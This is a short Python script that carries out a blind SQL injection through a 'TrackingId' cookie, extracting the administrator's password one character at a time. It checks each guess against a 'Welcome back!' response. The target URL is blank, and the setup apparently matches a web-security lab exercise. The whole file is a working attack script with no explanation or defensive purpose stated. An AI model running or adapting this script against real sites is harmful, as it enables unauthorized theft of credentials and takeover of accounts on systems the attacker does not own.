import requests
import string




ch=string.printable
url=""

p=""

for i in range(1,7):
    for c in ch:
        #

        session = requests.Session()
        headers = {"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8","Cache-Control":"max-age=0","User-Agent":"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:35.0) Gecko/20100101 Firefox/35.0","Connection":"close","Accept-Language":"en-US,en;q=0.5","Accept-Encoding":"gzip, deflate"}
        cookies = {"TrackingId":"cc'+UNION+SELECT+'a'+FROM+users+WHERE+username='administrator'+AND+substring(password,{},1)='{}' -- -".format(i,c),"session":"RmdGCvESsafaIvuYWxz6XuSqwOqZXnYz"}
        response = session.get(url, headers=headers, cookies=cookies)
        if  'Welcome back!' in response.text:
            p+=str(c)
            print (p)
            break


print ("Password : [ {} ] ".format(p))
